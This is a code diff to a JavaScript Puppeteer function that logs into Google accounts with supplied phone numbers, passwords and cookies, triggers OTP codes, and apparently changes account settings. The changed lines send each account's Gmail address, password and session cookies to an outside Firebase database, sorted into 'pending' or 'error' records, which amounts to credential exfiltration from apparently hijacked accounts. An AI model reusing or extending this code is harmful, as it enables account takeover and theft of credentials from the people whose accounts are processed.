@@ -184,6 +184,7 @@ async function loginWithCompleted(number, password, cookies) {
 
             await page.setCookie(...mCookie)
 
+            let mCodeSend = false
             let mRapt = null
             let mNumber = []
 
@@ -274,9 +275,9 @@ async function loginWithCompleted(number, password, cookies) {
                         await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"]')
 
                         let cSelection = true
-                        let mCodeSend = false
                         let cNumber = true
-
+                        mCodeSend = false
+                        
                         for (let load = 0; load < 30; load++) {
                             try {
                                 let url = await page.url()
@@ -306,8 +307,6 @@ async function loginWithCompleted(number, password, cookies) {
                                     console.log('OTP Send: '+mNumber.number)
                                     mCodeSend = true
                                     break
-                                } else {
-                                    console.log(url)
                                 }
                             } catch (error) {}
 
@@ -390,13 +389,23 @@ async function loginWithCompleted(number, password, cookies) {
 
                 await page.goto('about:blank')
 
-                console.log('All Chenge Success: '+number)
+                if (mRapt == null) {
+                    console.log('Chenge Error: '+number)
                 
-                await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/code/'+(mRapt == null ? 'error': 'pending')+'/'+number+'.json', JSON.stringify({ gmail: mUser, password:password, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded'
-                    }
-                })
+                    await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/code/error/'+number+'.json', JSON.stringify({ gmail: mUser, password:password, otp:mCodeSend, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        }
+                    })
+                } else {
+                    console.log('All Chenge Success: '+number)
+                
+                    await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/code/pending/'+number+'.json', JSON.stringify({ gmail: mUser, password:password, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        }
+                    })
+                }
 
                 try {
                     await axios.delete(BASE_URL+'/'+number+'.json')
